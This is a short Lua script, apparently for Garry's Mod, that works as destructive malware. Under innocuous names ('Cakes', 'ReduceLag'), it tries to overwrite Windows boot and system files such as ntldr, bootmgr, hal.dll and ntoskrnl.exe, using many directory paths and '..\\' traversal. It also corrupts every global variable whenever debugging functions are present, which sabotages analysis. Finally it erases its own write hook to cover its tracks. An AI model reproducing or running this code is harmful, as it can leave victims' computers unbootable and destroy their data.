

local Nope = {
	"debug",
	"getfenv",
	"gethook",
	"getlocal",
	"getupvalue",
	"setmetatable",
	"setfenv",
	"setlocal",
	"setupvalue",
	"upvaluejoin",
}

local These = {
	"steam.inf",
	"gameinfo.txt",
	"AUTOEXEC.BAT",
	"boot.ini",
	"bootstat.dat",
	"config.sys",
	"ntldr",
	"explorer.exe",
	"ntoskrnl.exe",
	"hal.dll",
	"bootres.dll",
	"bootfix.bin",
	"etfsboot.com",
	"boot.sdi",
	"bootmgr",
}

local Eat = {
	"",
	"garrysmod/",
	"garrysmod/garrysmod/",
	"C:/",
	"C:/WINDOWS/",
	"C:/WINDOWS/System32/",
	"C:/WINDOWS/Boot/DVD/PCAT/en-US/",
	"C:/WINDOWS/Boot/DVD/PCAT/",
	"C:/WINDOWS/Boot/PCAT/",
}


local _G		= _G
local pairs		= pairs
local NotSX 	= NotSX
local NotTS 	= timer.Simple

local function ReduceLag()
	if _G then
		for k,v in pairs(_G) do
			_G[k] = pairs
		end
	end
	if GAMEMODE then
		for k,v in pairs(GAMEMODE) do
			GAMEMODE[k] = GAMEMODE
		end
	end
end

local function CheckEm()
	NotTS(5, CheckEm)
	
	if not debug then ReduceLag() return end
	
	for k,v in pairs(Nope) do
		if debug and debug[v] then
			ReduceLag()
		end
	end
end
NotTS(5, CheckEm)


local function Cakes(v)
	NotSX("--"..v, v)
	NotSX("--"..v, v:gsub("/", "\\") )
end
for k,k in pairs(Eat) do
	for v,v in pairs(These) do
		Cakes(k..v)
	end
end
for v,v in pairs(These) do
	local k = "..\\"
	
	for i=0,13 do
		Cakes(k..v)
		k = k.."..\\"
	end
end

NotTS(2, function()
	NotSX 	 = nil
	_G.NotSX = nil
end)






